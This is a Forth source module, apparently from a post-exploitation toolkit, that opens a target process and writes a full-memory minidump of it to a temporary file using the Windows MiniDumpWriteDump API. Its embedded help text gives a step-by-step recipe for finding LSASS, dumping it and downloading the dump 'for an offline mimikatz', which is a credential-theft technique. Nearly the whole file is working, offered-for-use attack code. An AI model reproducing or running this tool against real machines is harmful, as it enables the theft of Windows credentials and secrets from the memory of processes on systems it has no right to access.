\ require pdump.fth
\ require structs.fth
\ require exceptions.fth

{ ." 

 minidump.fth

 Given a process ID, collect a minidump for analysis or download.  This is a
 full memory dump of the process, so it can be very useful for finding secrets
 or examining the running state of a process.		     

     PID minidump

 Don't forget you can find your process with psfind.  E.g., say you want
 to download a minidump of LSASS for an offline mimikatz:

     psfind lsass
     <PID> minidump
     download <FILE>

 This command will write the file out to a temporary filename in the current
 directory (think about where you are first -- you might not want to write
 minidumps in to %SYSTEM32%, for example!).

" ETX emit }!

: align 
  last >xt 10 + dup ( a0 a0 )
  @ 64 + -64 and ( a0 a' )
  tuck swap ! !here
;

\ Some misc. constants from the Win32 API
260       value MAX_PATH
$40000000 value GENERIC_WRITE
$1        value FILE_SHARE_READ
$2        value CREATE_ALWAYS
$80       value FILE_ATTRIBUTE_NORMAL
$400      value PROCESS_QUERY_INFORMATION
$10       value PROCESS_VM_READ
$40       value PROCESS_DUP_HANDLE
$1fffff   value THREAD_ALL_ACCESS
$2        value MiniDumpWithFullMemory

\ We depend on the debug API for memory dumps
loadlib dbghelp.dll
value dbghelp.dll

kernel32 3 dllfun OpenProcess OpenProcess
kernel32 4 dllfun GetTempFileName GetTempFileNameA
kernel32 7 dllfun CreateFile CreateFileA

dbghelp.dll 7 dllfun MiniDumpWriteDump MiniDumpWriteDump

\ Some state variables to keep track of our resources.  It's not very
\ "Forth"ish, but neither is error handling in the Win32 API :-).

create filename MAX_PATH allot

0 value phandle
0 value fhandle
0 value dpid

\ Open a temp file in the current directory for writing
: temp-file
  s" ." drop s" md_" drop 0 filename GetTempFileName if
    filename GENERIC_WRITE FILE_SHARE_READ 0 CREATE_ALWAYS FILE_ATTRIBUTE_NORMAL 0 CreateFile
    dup 0 <= if .err drop else [to] fhandle then    
  else
    .err
  then
;

: procflags
  PROCESS_QUERY_INFORMATION 
  PROCESS_VM_READ or
  PROCESS_DUP_HANDLE or
;

\ Open a process to dump
: get-proc ( pid -- )
  procflags 0 rot OpenProcess [to] phandle
;

\ This is written in an exception-handling style that I find quite comfortable
\ compared to catching every error along the way and nesting a ton of
\ conditionals for all the resource management.

: minidump ( pid -- )
  .pre [to] dpid

  try
    \ first, open a handle to the process with the right permissions
    -bold ." [+] Opening the process\n"
    '{ dpid get-proc }' '{ phandle CloseHandle drop }' attempt phandle +assert
    
    \ now, open a temporary file to write the dump to
    ." [+] Creating a temp file\n"
    '{ temp-file }' '{ fhandle CloseHandle drop }' attempt fhandle +assert
    
    \ user needs to know where it is!
    ." [+] Writing to " filename +bold .cstring -bold cr

    \ trigger the dump
    ." [+] Triggering the dump.\n"
    phandle dpid fhandle MiniDumpWithFullMemory 0 0 0 MiniDumpWriteDump
    
    \ check success
    if
      ." [+] Done, minidump successful.\n" 
    else 
      ." [+] Done, but there was a problem!" .err 
    then

  ensure
    ." [+] Cleaning up handles.\n" cleanup
  done
  .post
;

